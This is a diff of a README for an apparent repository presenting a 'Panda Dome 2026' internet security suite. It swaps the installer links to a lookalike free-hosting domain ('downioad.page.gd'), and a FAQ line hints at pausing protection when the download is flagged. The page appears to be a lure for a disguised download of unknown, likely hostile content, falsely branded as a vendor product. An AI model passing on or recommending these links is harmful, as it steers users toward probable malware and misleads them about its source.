@@ -2,7 +2,7 @@
 
 Welcome to the official repository for the **Panda Dome 2026 Complete Internet Suite**. This package provides a centralized collection of tools designed to enhance your digital security, protect your privacy, and optimize your online experience on Windows systems. Whether you're looking for robust threat detection, a reliable VPN connection, or a cleaner browsing environment, this suite brings it all together in a single, easy-to-manage application.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -61,7 +61,7 @@ A: This can sometimes happen with new software releases. You may temporarily pau
 
 The latest stable version of the Panda Dome 2026 Complete Internet Suite is available for download through the official channel below.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
